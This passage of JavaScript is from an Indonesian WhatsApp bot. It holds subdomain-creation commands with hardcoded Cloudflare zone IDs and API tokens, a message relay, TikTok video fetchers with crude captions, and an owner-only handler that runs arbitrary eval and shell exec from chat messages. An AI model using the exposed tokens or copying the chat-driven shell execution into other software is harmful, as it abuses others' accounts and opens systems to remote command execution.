             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain18': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5024bc4a02924cf69ddf4dfa6ee96069";
               let apitoken = "OajJ0jtCB0FTFwfdiTB_ktzNKFWAmsENFdlE4Hvd";
               let tld = "dewapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain18 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
           case 'domain19': {
 
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f22b76756f00ec227c2007ac8ebbeb88";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiaofficial.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain19 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain InzieOfc⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'pesan': case 'buyer': {
if (!args || !args[0]) return m.reply(`🚩 Please enter the message\nExample of Use: ${prefix + command} ${owner} pesan untuknya`)
let ngen = ['|']
if (args[0].includes(ngen)) return m.reply('Replace Symbol | So spaces')
if (args[0].length > 14) return m.reply('Extension Number')
if (args[0].length < 7) return m.reply('Abbreviation Number')
if (args[0].startsWith('0')) return reply('Use format 62')
if (!args[0]) return reply('Masukkan Teks')
let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
let q = m.quoted ? m.quoted : m
let mime = (q.m || q).mimetype || ''
let tujuan = `${txt}`
if (!m.quoted) {
RezzHost.sendText(mention, tujuan)
} else {
RezzHost.sendText(mention, tujuan)
let media = q ? await m.getQuotedObj() : false || m
await RezzHost.copyNForward(mention, media, false).catch(_ => _)
}
let suks = `Mengirim Pesan *${mime ? mime : 'Teks'}*
*_Success ✅_*

Text :
${txt}
`
RezzHost.sendMessage(m.chat, { text: `${suks}`, mentions: [suks] }, { quoted: kalgans })

}
break
case 'asupan1':
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ytq5b/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
	//=================================================//
case 'asupan2':
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9a9d/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan3':
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YpRr4/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan4':
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YfoYm/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan5':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://www.tiktok.com/@menantu_idamannnn/video/7211912588366548251?_r=1&u_code=dgc2fmm4i3k9b1&region=ID&mid=7211912606574627610&preview_pb=0&sharer_language=id&_d=d9iga21gg7d358&share_item_id=7211912588366548251&source=h5_t&timestamp=1682941528&user_id=6914652081950639106&sec_user_id=MS4wLjABAAAABSJMM2SSvwkONssmfetetURo2KRIL-wv22KQFCPh-ARQ0bEMn7lZ3gkjm6BhZdlm&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7227953970441242394&share_link_id=5530f877-35fd-4db3-9b7c-d0c8e7e749ed&share_app_id=1180&ugbiz_name=Main&ug_btm=b6880%2Cb2878`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan6':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YyKm7/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan7':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpweu7/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan8':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9Y2p/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan9':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ygms3/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan10':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YsuNQ/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan11':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YtYaQ/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan12':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YbpvJ/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan13':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9FaD/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan14':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpXDPm/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan15':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpvaTV/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan16':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YaXCU/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan17':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83EKHja/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan18':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yyk6y/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case 'asupan19':

	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yb7GX/`).then(({ data }) => {
RezzHost.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Nih!!! Dasar Sange` })
	})
	break
//=================================================//
case "asupan20":{

await loading()
m.reply('*Ah Males Sangean*')
}
break
case 'creator': 
case 'owner': {
if (!isCreator) return m.reply(mess.owner);
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img = "https://telegra.ph/file/42c647df30fa35fe23acf.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url }}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*HAI KAK ${pushname}\nBrikut Adalah Owner Ku`)  },
carouselMessage: {
cards: [{
header: {
imageMessage: await image(img),
hasMediaAttachment: true,
},
body: { text: `*MY OWNER RISKY OFC - MD*\n*RISKY OFC*` },
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 OWNER","url":"https:\\/\\/wa.me\\/6282173242194?text=Halo+Owner+Mau+pesan+PAKET","webview_presentation":null}',
},],},},{
header: {
imageMessage: await image(img),
hasMediaAttachment: true,
},
body: { text: `> *CHANEL OWNER BOT*` },
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👥 GRUP ETMIN","url":"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k","merchant_url":"https://www.google.com"}',
},],},},],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isCreator) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
RezzHost.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
console.log(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
